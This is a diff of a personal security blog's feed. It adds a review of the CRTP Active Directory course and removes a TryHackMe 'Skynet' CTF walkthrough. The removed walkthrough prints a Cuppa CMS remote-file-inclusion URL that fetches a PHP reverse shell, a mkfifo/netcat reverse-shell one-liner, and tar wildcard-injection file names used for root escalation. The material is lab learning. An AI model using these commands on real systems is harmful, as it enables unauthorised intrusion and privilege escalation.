@@ -4,7 +4,7 @@
   <generator uri="https://jekyllrb.com/" version="3.7.4">Jekyll</generator>
   <link href="https://darrynbrownfield.co.uk/author/darryn/feed.xml" rel="self" type="application/atom+xml" />
   <link href="https://darrynbrownfield.co.uk/" rel="alternate" type="text/html" />
-  <updated>2021-08-13T15:50:26+00:00</updated>
+  <updated>2021-10-26T07:52:25+00:00</updated>
   <id>https://darrynbrownfield.co.uk/author/darryn/feed.xml</id>
 
   
@@ -30,6 +30,108 @@
   
   
 
+  
+    <entry>
+      <title type="html">CRTP Review</title>
+      <link href="https://darrynbrownfield.co.uk/crtp" rel="alternate" type="text/html" title="CRTP Review" />
+      <published>2021-10-25T00:00:00+00:00</published>
+      <updated>2021-10-25T00:00:00+00:00</updated>
+      <id>https://darrynbrownfield.co.uk/crtp</id>
+      <content type="html" xml:base="https://darrynbrownfield.co.uk/crtp">&lt;p&gt;&lt;img src=&quot;/assets/images/crtp/cover1.png&quot; alt=&quot;cover&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;I have recently completed the &lt;a href=&quot;https://www.pentesteracademy.com/activedirectorylab&quot;&gt;Attacking and Defending Active Directory&lt;/a&gt; course from Pentester Academy and wanted to share my thoughts for anyone looking to take the course and take the CTRP exam.&lt;/p&gt;
+
+&lt;p&gt;The course is very beginner friendly, no prior knowledge of attacking active directory or using PowerShell is required. However, I do recommend understanding the basis before the course. Resources like &lt;a href=&quot;https://tryhackme.com&quot;&gt;TryHackMe&lt;/a&gt; will provide a good overview of basic terminology, privilege escalation and reverse shells etc. At a high-level the course covers:&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Domain Enumeration&lt;/li&gt;
+  &lt;li&gt;Local Privilege Escalation&lt;/li&gt;
+  &lt;li&gt;Lateral Movement&lt;/li&gt;
+  &lt;li&gt;Domain Persistence&lt;/li&gt;
+  &lt;li&gt;Domain Privilege Escalation&lt;/li&gt;
+  &lt;li&gt;Cross-Forest Attacks&lt;/li&gt;
+  &lt;li&gt;Forest Persistence&lt;/li&gt;
+  &lt;li&gt;Detection and Defense&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;As part of the course you get all the learning material and access to a AD lab to practice the attacks in a controlled environment. For the lab access you can choose 30, 60 or 90 days of access. I only took 30 days but I think this is plenty to cover all the material and complete the labs but of course it depends on the time you can spend on it. I would spend a few hours a couple of evenings a week and a good 4 or 5 hours on a weekend.&lt;/p&gt;
+
+&lt;h3 id=&quot;the-course&quot;&gt;The Course&lt;/h3&gt;
+
+&lt;p&gt;Once you have registered you will receive access to a portal which provides:&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Course videos&lt;/li&gt;
+  &lt;li&gt;Course slides&lt;/li&gt;
+  &lt;li&gt;Lab guide&lt;/li&gt;
+  &lt;li&gt;Lab walk through videos&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;You will also be asked when you wish to obtain access to the labs. I think this a great option as some people will prefer to watch everything then focus on the labs. However my methodology was:&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Watch the video for a section&lt;/li&gt;
+  &lt;li&gt;Read the section slides and notes&lt;/li&gt;
+  &lt;li&gt;Complete the learning objective for that section&lt;/li&gt;
+  &lt;li&gt;Watch the lab walk through&lt;/li&gt;
+  &lt;li&gt;Repeat for the next section&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;I preferred to do each section at a time and fully understand it before moving on to the next.&lt;/p&gt;
+
+&lt;p&gt;The course videos are good, I think they are missing some post production flare as its just the instructor with some slides and demos, however that being said the content (which is the important bit really) is fantastic. &lt;a href=&quot;https://twitter.com/nikhil_mitt&quot;&gt;Nikhil Mittal&lt;/a&gt; clearly breaks down each subject and explains each attack and provides a demo of how it works.&lt;/p&gt;
+
+&lt;p&gt;At the end of each learning section is a learning objective to complete in the labs. These are not like the OSCP labs, this environment is to be used with the learning material to try out each attack. Additionally, on the portal is a flag verification tab with questions, the answers are to be discovered whilst completing the labs. These aren’t like CTF hash flags but snippets of information such as ‘NTLM hash of UserX’. While completing the course I had no issues at all with the labs, they are shared with other students but this didn’t cause me any problems.&lt;/p&gt;
+
+&lt;h3 id=&quot;the-exam&quot;&gt;The Exam&lt;/h3&gt;
+
+&lt;p&gt;The exam was fun! You are given 24 hours to enumerate and compromise a AD environment of 5 machines. You are provided with an additional machine to provide a foothold on to the network but that is it. No tools are on the machine, anything you want to use must be first copied over. After the 24 hour period you are given 48 hours to write up your findings and submit a report.&lt;/p&gt;
+
+&lt;p&gt;A couple of days before the exam started, I created the report template and read through all my notes from the course. I use Onenote for note taking, so I created a new section specifically for the exam with a sub section for each machine and some general sections for notes, credentials etc so I could quickly copy and paste details.&lt;/p&gt;
+
+&lt;p&gt;I started the exam at around 11.30, by 15.00 I had managed to gain privesc on the foothold machine and compromise two others but then came hell, machine 3. I was stuck, for hours…… 11 hours later at 02.00 I decided I needed sleep and managed to sleep until 05.00. I was sure I knew how to compromise machines 4 and 5 based on the enumeration I had done but the machines needed to be done in order. However, at 05.30 I had access! I was completely overthinking it, having the break and stepping away allowed me to start again and look it with a fresh (but tired) pair of eyes. By 06.15 I was able to compromise the remaining machines.&lt;/p&gt;
+
+&lt;p&gt;I went though and got all my notes and screenshots so I could create my write up and by 10.00 submitted my report. I got confirmation they received it and would get back to me with result. 6 days passed and then I finally I got the confirmation I passed!&lt;/p&gt;
+
+&lt;h3 id=&quot;final-thoughts&quot;&gt;Final Thoughts&lt;/h3&gt;
+
+&lt;p&gt;I highly recommend the course to anyone involved in attack or defending AD. From a offensive perspective the course gives a good understanding of some of the attacks available and hands on experience testing them and moving around a domain. From a defensive perspective, its a must! 30 days is plenty of time to complete all the material and the labs multiple times. The exam is tough but fair and as long as you understand all the course material you can pass the exam.&lt;/p&gt;
+
+&lt;p&gt;Im proud to say I’m now CRTP!&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/crtp/cert.png&quot; alt=&quot;cover&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Thanks for reading!&lt;/p&gt;</content>
+
+      
+      
+      
+      
+      
+
+      <author>
+          <name>Darryn</name>
+        
+        
+      </author>
+
+      
+
+      
+        <category term="review" />
+      
+        <category term="crtp" />
+      
+        <category term="ad" />
+      
+
+      
+        <summary type="html"></summary>
+      
+
+      
+      
+    </entry>
   
     <entry>
       <title type="html">Couch Write Up</title>
@@ -2959,341 +3061,6 @@ echo $cmd
 bash-4.3# whoami
 root
 &lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Thanks for reading!&lt;/p&gt;</content>
-
-      
-      
-      
-      
-      
-
-      <author>
-          <name>Darryn</name>
-        
-        
-      </author>
-
-      
-
-      
-        <category term="tryhackme" />
-      
-        <category term="ctf" />
-      
-        <category term="easy" />
-      
-
-      
-        <summary type="html"></summary>
-      
-
-      
-      
-    </entry>
-  
-    <entry>
-      <title type="html">Skynet Write Up</title>
-      <link href="https://darrynbrownfield.co.uk/skynet" rel="alternate" type="text/html" title="Skynet Write Up" />
-      <published>2021-01-30T00:00:00+00:00</published>
-      <updated>2021-01-30T00:00:00+00:00</updated>
-      <id>https://darrynbrownfield.co.uk/skynet</id>
-      <content type="html" xml:base="https://darrynbrownfield.co.uk/skynet">&lt;p&gt;&lt;img src=&quot;/assets/images/skynet/cover.png&quot; alt=&quot;skynet&quot; /&gt;&lt;/p&gt;
-
-&lt;h3 id=&quot;overview&quot;&gt;Overview&lt;/h3&gt;
-
-&lt;p&gt;&lt;a href=&quot;https://tryhackme.com/room/skynet&quot;&gt;Skynet&lt;/a&gt; is a easy rated CTF room on &lt;a href=&quot;https://tryhackme.com&quot;&gt;TryHackMe&lt;/a&gt;.&lt;/p&gt;
-
-&lt;blockquote&gt;
-  &lt;p&gt;Are you able to compromise this Terminator themed machine?&lt;/p&gt;
-&lt;/blockquote&gt;
-
-&lt;h3 id=&quot;nmap&quot;&gt;Nmap&lt;/h3&gt;
-
-&lt;p&gt;I deployed the machine and was given the target IP 10.10.120.207. I started a NMAP scan to check the available ports.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;└──╼ $sudo nmap -sC -sV -oN nmap/initial 10.10.120.207
-Starting Nmap 7.80 ( https://nmap.org ) at 2021-01-24 16:37 GMT
-Nmap scan report for 10.10.120.207
-Host is up (0.032s latency).
-Not shown: 994 closed ports
-PORT    STATE SERVICE     VERSION
-22/tcp  open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
-| ssh-hostkey:
-|   2048 99:23:31:bb:b1:e9:43:b7:56:94:4c:b9:e8:21:46:c5 (RSA)
-|   256 57:c0:75:02:71:2d:19:31:83:db:e4:fe:67:96:68:cf (ECDSA)
-|_  256 46:fa:4e:fc:10:a5:4f:57:57:d0:6d:54:f6:c3:4d:fe (ED25519)
-80/tcp  open  http        Apache httpd 2.4.18 ((Ubuntu))
-|_http-server-header: Apache/2.4.18 (Ubuntu)
-|_http-title: Skynet
-110/tcp open  pop3        Dovecot pop3d
-|_pop3-capabilities: AUTH-RESP-CODE CAPA PIPELINING RESP-CODES UIDL SASL TOP
-139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
-143/tcp open  imap        Dovecot imapd
-|_imap-capabilities: Pre-login IMAP4rev1 ENABLE LOGINDISABLEDA0001 more LOGIN-REFERRALS have SASL-IR listed ID capabilities LITERAL+ post-login IDLE OK
-445/tcp open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
-Service Info: Host: SKYNET; OS: Linux; CPE: cpe:/o:linux:linux_kernel
-
-Host script results:
-|_clock-skew: mean: 1h59m59s, deviation: 3h27m50s, median: 0s
-|_nbstat: NetBIOS name: SKYNET, NetBIOS user: &amp;lt;unknown&amp;gt;, NetBIOS MAC: &amp;lt;unknown&amp;gt; (unknown)
-| smb-os-discovery:
-|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
-|   Computer name: skynet
-|   NetBIOS computer name: SKYNET\x00
-|   Domain name: \x00
-|   FQDN: skynet
-|_  System time: 2021-01-24T10:37:29-06:00
-| smb-security-mode:
-|   account_used: guest
-|   authentication_level: user
-|   challenge_response: supported
-|_  message_signing: disabled (dangerous, but default)
-| smb2-security-mode:
-|   2.02:
-|_    Message signing enabled but not required
-| smb2-time:
-|   date: 2021-01-24T16:37:29
-|_  start_date: N/A
-
-Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-Nmap done: 1 IP address (1 host up) scanned in 13.79 seconds
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;6 Ports open:&lt;/p&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;22 - SSH - Banner is showing its an Ubuntu machine&lt;/li&gt;
-  &lt;li&gt;80 - HTTP - Apache web server version 2.4.18&lt;/li&gt;
-  &lt;li&gt;110 - POP3 - Dovecot&lt;/li&gt;
-  &lt;li&gt;139/445 - Samba&lt;/li&gt;
-  &lt;li&gt;143 - IMAP - Dovecot&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;h3 id=&quot;enumeration&quot;&gt;Enumeration&lt;/h3&gt;
-
-&lt;p&gt;A few ports to review but I started with SMB because typically in CTF’s you can find anonymous access to share which provide hints or files required on other ports. Using smbmap I found one accessible share called anonymous.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;└──╼ $smbmap -H 10.10.120.207
-[+] Guest session       IP: 10.10.120.207:445   Name: 10.10.120.207                                     
-        Disk                                                    Permissions     Comment
-        ----                                                    -----------     -------
-        print$                                                  NO ACCESS       Printer Drivers
-        anonymous                                               READ ONLY       Skynet Anonymous Share
-        milesdyson                                              NO ACCESS       Miles Dyson Personal Share
-        IPC$                                                    NO ACCESS       IPC Service (skynet server (Samba, Ubuntu))
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Using smbclient I was able to connect to the share and found a text file and a folder of logs files. I downloaded all the files to my machine.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;└──╼ $smbclient //10.10.120.207/anonymous
-Try &quot;help&quot; to get a list of possible commands.
-smb: \&amp;gt; ls
-  .                                   D        0  Thu Nov 26 16:04:00 2020
-  ..                                  D        0  Tue Sep 17 08:20:17 2019
-  attention.txt                       N      163  Wed Sep 18 04:04:59 2019
-  logs                                D        0  Wed Sep 18 05:42:16 2019
-
-                9204224 blocks of size 1024. 5822640 blocks available
-smb: \&amp;gt; get attention.txt 
-getting file \attention.txt of size 163 as attention.txt (1.2 KiloBytes/sec) (average 1.2 KiloBytes/sec)
-smb: \&amp;gt; cd logs
-smb: \logs\&amp;gt; ls
-  .                                   D        0  Wed Sep 18 05:42:16 2019
-  ..                                  D        0  Thu Nov 26 16:04:00 2020
-  log2.txt                            N        0  Wed Sep 18 05:42:13 2019
-  log1.txt                            N      471  Wed Sep 18 05:41:59 2019
-  log3.txt                            N        0  Wed Sep 18 05:42:16 2019
-
-                9204224 blocks of size 1024. 5819896 blocks available
-smb: \logs\&amp;gt; mget *
-Get file log2.txt? y
-getting file \logs\log2.txt of size 0 as log2.txt (0.0 KiloBytes/sec) (average 0.7 KiloBytes/sec)
-Get file log1.txt? y
-getting file \logs\log1.txt of size 471 as log1.txt (4.1 KiloBytes/sec) (average 1.8 KiloBytes/sec)
-Get file log3.txt? y
-getting file \logs\log3.txt of size 0 as log3.txt (0.0 KiloBytes/sec) (average 1.4 KiloBytes/sec)
-smb: \logs\&amp;gt; 
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;The attention.txt file is a note:&lt;/p&gt;
-
-&lt;p&gt;“A recent system malfunction has caused various passwords to be changed. All skynet employees are required to change their password after seeing this.
--Miles Dyson”&lt;/p&gt;
-
-&lt;p&gt;However log1.txt looks to be a password list. log2 and log3 are empty. I moved on to start enumerating the website.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/skynet/webpage.png&quot; alt=&quot;webpage&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Nothing to note on the page or in the page source so I ran a gobuster.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;┌─[daz@parrot]─[~/Documents/TryHackMe/Skynet]
-└──╼ $gobuster dir -u http://10.10.120.207 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50
-===============================================================
-Gobuster v3.0.1
-by OJ Reeves (@TheColonial) &amp;amp; Christian Mehlmauer (@_FireFart_)
-===============================================================
-[+] Url:            http://10.10.120.207
-[+] Threads:        50
-[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
-[+] Status codes:   200,204,301,302,307,401,403
-[+] User Agent:     gobuster/3.0.1
-[+] Timeout:        10s
-===============================================================
-2021/01/24 16:38:47 Starting gobuster
-===============================================================
-/admin (Status: 301)
-/css (Status: 301)
-/js (Status: 301)
-/config (Status: 301)
-/ai (Status: 301)
-/squirrelmail (Status: 301)
-/server-status (Status: 403)
-===============================================================
-2021/01/24 16:41:06 Finished
-===============================================================
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;/squirrelmail brings to me to a login page.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/skynet/squirrelmail.png&quot; alt=&quot;squirrelmail&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Using Burp intruder I was able to find the login details for Miles. I created a username file with the following entries:&lt;/p&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;miles&lt;/li&gt;
-  &lt;li&gt;mdyson&lt;/li&gt;
-  &lt;li&gt;milesdyson&lt;/li&gt;
-  &lt;li&gt;milesd&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;p&gt;Using this list of usernames and the passwords found in log1.txt I was able to access the email account.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/skynet/emails.png&quot; alt=&quot;emails&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;One of the emails is miles new SMB password.&lt;/p&gt;
-
-&lt;p&gt;“We have changed your smb password after system malfunction.
-Password: )s{A&amp;amp;2Z{REDACTED}”&lt;/p&gt;
-
-&lt;p&gt;Going back to smbclient I tried to connect to the SMB share milesdyson with the new password and got in.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;└──╼ $smbclient //10.10.120.207/milesdyson -U milesdyson -p                                         
-Enter WORKGROUP\milesdyson's password:                                                              
-Try &quot;help&quot; to get a list of possible commands.                                                      
-smb: \&amp;gt; ls                                                                                          
-  .                                   D        0  Tue Sep 17 10:05:47 2019                          
-  ..                                  D        0  Wed Sep 18 04:51:03 2019                          
-  Improving Deep Neural Networks.pdf      N  5743095  Tue Sep 17 10:05:14 2019                      
-  Natural Language Processing-Building Sequence Models.pdf      N 12927230  Tue Sep 17 10:05:14 2019
-  Convolutional Neural Networks-CNN.pdf      N 19655446  Tue Sep 17 10:05:14 2019                   
-  notes                               D        0  Tue Sep 17 10:18:40 2019                          
-  Neural Networks and Deep Learning.pdf      N  4304586  Tue Sep 17 10:05:14 2019                   
-  Structuring your Machine Learning Project.pdf      N  3531427  Tue Sep 17 10:05:14 2019           
-                                                                                                    
-                9204224 blocks of size 1024. 5810144 blocks available                               
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Only really one file of interest /notes/important.txt&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;└──╼ $cat important.txt 
-
-1. Add features to beta CMS /45kra2{REDACTED}
-2. Work on T-800 Model 101 blueprints
-3. Spend more time with my wife
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;A new cms directory to probe, looking at the page it appears to be a blog page for Miles.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/skynet/miles.png&quot; alt=&quot;miles&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Running gobuster again against the directory reveals a administrator page.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;└──╼ $gobuster dir -u http://10.10.120.207/45kra2{REDACTED}/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50
-===============================================================
-Gobuster v3.0.1
-by OJ Reeves (@TheColonial) &amp;amp; Christian Mehlmauer (@_FireFart_)
-===============================================================
-[+] Url:            http://10.10.120.207/45kra2{REDACTED}/
-[+] Threads:        50
-[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
-[+] Status codes:   200,204,301,302,307,401,403
-[+] User Agent:     gobuster/3.0.1
-[+] Timeout:        10s
-===============================================================
-2021/01/24 16:48:27 Starting gobuster
-===============================================================
-/administrator (Status: 301)
-===============================================================
-2021/01/24 16:50:42 Finished
-===============================================================
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;h3 id=&quot;initial-access&quot;&gt;Initial Access&lt;/h3&gt;
-
-&lt;p&gt;Going to http://10.10.120.207/45kra2{REDACTED}/administrator/ takes us to a login page for Cuppa CMS. A quick Google reveals the &lt;a href=&quot;https://www.exploit-db.com/exploits/25971&quot;&gt;exploit&lt;/a&gt; which provides and local and remote file inclusion.&lt;/p&gt;
-
-&lt;p&gt;Looking at the exploit we can simply request a URL with our shell code location. We can use this to get a reverse shell payload from our machine and then execute.&lt;/p&gt;
-
-&lt;blockquote&gt;
-  &lt;p&gt;http://target/cuppa/alerts/alertConfigField.php?urlConfig=http://www.shell.com/shell.txt?&lt;/p&gt;
-&lt;/blockquote&gt;
-
-&lt;p&gt;On my machine I copied /usr/share/webshells/php/php-reverse-shell.php to my working directory and renamed it to shell.php, I updated the configuration to include my VPN IP and port 4444.&lt;/p&gt;
-
-&lt;p&gt;Then using python3 I started a http server to host the reverse shell payload and started a netcat listener on port 4444. In my browser I entered:&lt;/p&gt;
-
-&lt;p&gt;http://10.10.120.207/45kra2{REDACTED}/administrator/alerts/alertConfigField.php?urlConfig=http:///shell.php&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;└──╼ $sudo python3 -m http.server 80                                      
-                                                                          
-Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...                  
-10.10.120.207 - - [24/Jan/2021 16:57:15] &quot;GET /shell.php HTTP/1.0&quot; 200 -  
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;On my netcat listener I get a response and got a shell as ‘www-data’.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;└──╼ $nc -nvlp 4444
-listening on [any] 4444 ...
-connect to [] from (UNKNOWN) [10.10.120.207] 59292
-Linux skynet 4.8.0-58-generic #63~16.04.1-Ubuntu SMP Mon Jun 26 18:08:51 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux
- 10:57:15 up 22 min,  0 users,  load average: 0.00, 0.04, 0.06
-USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
-uid=33(www-data) gid=33(www-data) groups=33(www-data)
-/bin/sh: 0: can't access tty; job control turned off
-$ id
-uid=33(www-data) gid=33(www-data) groups=33(www-data)
-$   
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;h3 id=&quot;priv-esc&quot;&gt;Priv Esc&lt;/h3&gt;
-
-&lt;p&gt;Looking at the file system there are two files backup.sh and backup.tgz both owned by root.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;drwxr-xr-x 2 root       root       4.0K Sep 17  2019 .
-drwxr-xr-x 5 milesdyson milesdyson 4.0K Sep 17  2019 ..
--rwxr-xr-x 1 root       root         74 Sep 17  2019 backup.sh
--rw-r--r-- 1 root       root       4.5M Jan 24 10:59 backup.tgz
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;The script is really simple, just creating a backup tar file or /var/www/html.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;$ cat backup.sh
-#!/bin/bash
-cd /var/www/html
-tar cf /home/milesdyson/backups/backup.tgz *
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;However because the tar command is using * which is a wild card and it appears the script is being run by root as a cron job we can exploit this to get a reverse shell. This &lt;a href=&quot;https://www.hackingarticles.in/exploiting-wildcard-for-privilege-escalation/&quot;&gt;article&lt;/a&gt; explains it in detail.&lt;/p&gt;
-
-&lt;p&gt;I following the same steps in the article and set my port to 5555 as already have a shell on port 4444.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;echo &quot;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&amp;gt;&amp;amp;1|nc  5555 &amp;gt;/tmp/f&quot; &amp;gt; shell.sh
-echo &quot;&quot; &amp;gt; &quot;--checkpoint-action=exec=sh shell.sh&quot;
-echo &quot;&quot; &amp;gt; &quot;--checkpoint=1&quot;
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Now just wait for a minute and we now have a root shell!&lt;/p&gt;
 
 &lt;p&gt;Thanks for reading!&lt;/p&gt;</content>
 
